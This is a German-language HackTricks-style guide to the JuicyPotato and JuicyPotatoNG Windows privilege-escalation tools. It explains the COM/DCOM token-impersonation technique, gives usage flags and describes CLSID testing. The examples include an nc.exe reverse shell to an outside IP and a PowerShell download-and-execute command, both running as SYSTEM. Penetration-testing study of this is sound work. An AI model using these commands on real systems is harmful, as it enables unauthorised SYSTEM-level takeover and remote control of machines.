# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato ist veraltet. Es funktioniert im Allgemeinen mit Windows-Versionen bis Windows 10 1803 / Windows Server 2016. Von Microsoft ab Windows 10 1809 / Server 2019 ausgelieferte Änderungen haben die ursprüngliche Technik funktionsunfähig gemacht. Für diese und neuere Builds solltest du moderne Alternativen wie PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato und andere in Betracht ziehen. Siehe die folgende Seite für aktuelle Optionen und deren Verwendung.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (Ausnutzung der goldenen Privilegien) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Eine verbesserte Version von_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, mit etwas Saft, d. h. **ein weiteres Local Privilege Escalation-Tool, um von Windows Service Accounts zu NT AUTHORITY\SYSTEM zu gelangen**_<sup>[[1]](#references)</sup>

#### Du kannst juicypotato unter [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) herunterladen

### Kurze Hinweise zur Kompatibilität

- Funktioniert zuverlässig bis Windows 10 1803 und Windows Server 2016, wenn der aktuelle Kontext über SeImpersonatePrivilege oder SeAssignPrimaryTokenPrivilege verfügt.
- Durch das Microsoft-Hardening in Windows 10 1809 / Windows Server 2019 und später funktionsunfähig. Für diese Builds solltest du die oben verlinkten Alternativen bevorzugen.

### Zusammenfassung <a href="#summary" id="summary"></a>

[**Aus der juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) und seine [Varianten](https://github.com/decoder-it/lonelypotato) nutzen die auf der [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>)-[service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) basierende Privilege-Escalation-Kette, wobei der MiTM-Listener auf `127.0.0.1:6666` läuft und du über `SeImpersonate`- oder `SeAssignPrimaryToken`-Privilegien verfügst. Bei einer Überprüfung eines Windows-Builds fanden wir eine Konfiguration, in der `BITS` absichtlich deaktiviert und Port `6666` belegt war.

Wir beschlossen, [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) zu weaponizen: **Sag Hallo zu Juicy Potato.**

> Für die Theorie siehe [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) und folge der Kette aus Links und Referenzen.<sup>[[4]](#references)</sup>

Wir stellten fest, dass wir neben `BITS` mehrere COM-Server ausnutzen können. Sie müssen lediglich:

1. vom aktuellen Benutzer instanziierbar sein, normalerweise ein „service user“, der über Impersonation-Privilegien verfügt
2. das `IMarshal`-Interface implementieren
3. als Benutzer mit erhöhten Rechten laufen (SYSTEM, Administrator, …)

Nach einigen Tests erhielten und testeten wir eine umfangreiche Liste [interessanter CLSIDs](http://ohpe.it/juicy-potato/CLSID/) auf mehreren Windows-Versionen.

### Juicy-Details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ermöglicht dir Folgendes:<sup>[[1]](#references)</sup>

- **Ziel-CLSID** _Wähle eine beliebige CLSID aus._ [_Hier_](http://ohpe.it/juicy-potato/CLSID/) _findest du die nach OS organisierte Liste._
- **COM-Listening-Port** _Definiere den von dir bevorzugten COM-Listening-Port (anstelle des fest im Marshaling codierten Ports 6666)._
- **COM-Listening-IP-Adresse** _Binde den Server an eine beliebige IP._
- **Process creation mode** _Abhängig von den Privilegien des impersonierten Benutzers kannst du auswählen:_
- `CreateProcessWithToken` (benötigt `SeImpersonate`)
- `CreateProcessAsUser` (benötigt `SeAssignPrimaryToken`)
- `both`
- **Zu startender Prozess** _Starte eine ausführbare Datei oder ein Script, wenn die Ausnutzung erfolgreich ist._
- **Process Argument** _Passe die Argumente des gestarteten Prozesses an._
- **RPC Server address** _Für einen unauffälligen Ansatz kannst du dich bei einem externen RPC-Server authentifizieren._
- **RPC Server port** _Nützlich, wenn du dich bei einem externen Server authentifizieren möchtest und eine Firewall Port `135` blockiert …_
- **TEST mode** _Hauptsächlich zu Testzwecken, z. B. zum Testen von CLSIDs. Dabei wird der DCOM erstellt und der Benutzer des Tokens ausgegeben. Siehe_ [_hier zum Testen_](http://ohpe.it/juicy-potato/Test/)

### Verwendung <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Abschließende Gedanken <a href="#final-thoughts" id="final-thoughts"></a>

[**Aus dem juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Wenn der Benutzer über die Berechtigungen `SeImpersonate` oder `SeAssignPrimaryToken` verfügt, bist du **SYSTEM**.

Es ist nahezu unmöglich, den Missbrauch all dieser COM Server zu verhindern. Man könnte darüber nachdenken, die Berechtigungen dieser Objekte über `DCOMCNFG` zu ändern, aber viel Glück dabei – das wird eine Herausforderung.

Die eigentliche Lösung besteht darin, sensible Konten und Anwendungen zu schützen, die unter den Konten `* SERVICE` ausgeführt werden. Das Deaktivieren von `DCOM` würde diesen Exploit sicherlich verhindern, könnte jedoch erhebliche Auswirkungen auf das zugrunde liegende Betriebssystem haben.

Quelle: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG führt eine JuicyPotato-ähnliche lokale Privilege Escalation auf modernen Windows-Systemen wieder ein, indem es Folgendes kombiniert:<sup>[[2]](#references)</sup>
- DCOM OXID resolution zu einem lokalen RPC Server an einem ausgewählten Port, wodurch der alte fest codierte Listener auf 127.0.0.1:6666 vermieden wird.
- Einen SSPI hook zum Abfangen und Impersonate der eingehenden SYSTEM-Authentifizierung, ohne RpcImpersonateClient zu benötigen. Dadurch wird CreateProcessAsUser auch dann ermöglicht, wenn nur SeAssignPrimaryTokenPrivilege vorhanden ist.
- Tricks, um die Einschränkungen bei der DCOM activation zu erfüllen, z. B. die frühere Anforderung der INTERACTIVE-Gruppe beim Targeting der Klassen PrintNotify / ActiveX Installer Service.

Wichtige Hinweise (sich veränderndes Verhalten zwischen verschiedenen Builds):<sup>[[2]](#references)</sup>
- September 2022: Die ursprüngliche Technik funktionierte auf unterstützten Windows 10/11- und Server-Targets unter Verwendung des „INTERACTIVE trick“.
- Update der Autoren vom Januar 2023: Microsoft blockierte den INTERACTIVE trick später. Eine andere CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) stellt die Exploitation wieder her, laut ihrem Beitrag jedoch nur unter Windows 11 / Server 2022.

Grundlegende Nutzung (weitere Flags in der Hilfe):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Wenn du Windows 10 1809 / Server 2019 angreifst, wo klassisches JuicyPotato gepatcht ist, bevorzuge die oben verlinkten Alternativen (RoguePotato, PrintSpoofer, EfsPotato/GodPotato usw.). NG kann je nach Build und Service-Zustand situationsabhängig sein.

## Beispiele

Hinweis: Besuche [diese Seite](https://ohpe.it/juicy-potato/CLSID/) für eine Liste von CLSIDs zum Ausprobieren.

### Eine nc.exe Reverse Shell erhalten
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Einen neuen CMD starten (wenn Sie RDP-Zugriff haben)

![Powershell rev - Einen neuen CMD starten (wenn Sie RDP-Zugriff haben): Einen neuen CMD starten (wenn Sie RDP-Zugriff haben)](<../../images/image (300).png>)

## CLSID-Probleme

Oft funktioniert die standardmäßige CLSID, die JuicyPotato verwendet, **nicht**, und der Exploit schlägt fehl. Normalerweise sind mehrere Versuche erforderlich, um eine **funktionierende CLSID** zu finden. Eine Liste der CLSIDs, die Sie für ein bestimmtes Betriebssystem ausprobieren können, finden Sie auf dieser Seite:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID überprüfen**

Zuerst benötigen Sie neben juicypotato.exe einige weitere ausführbare Dateien.

Laden Sie [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) herunter und laden Sie es in Ihre PS-Sitzung. Laden Sie anschließend [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) herunter und führen Sie es aus. Dieses Skript erstellt eine Liste möglicher CLSIDs zum Testen.

Laden Sie danach [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) herunter (passen Sie den Pfad zur CLSID-Liste und zur juicypotato-Executable an) und führen Sie die Datei aus. Sie beginnt, jede CLSID auszuprobieren. **Wenn sich die Portnummer ändert, bedeutet dies, dass die CLSID funktioniert hat.**

**Überprüfen** Sie die funktionierenden CLSIDs **mit dem Parameter -c**.

## Referenzen

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

{{#include ../../banners/hacktricks-training.md}}
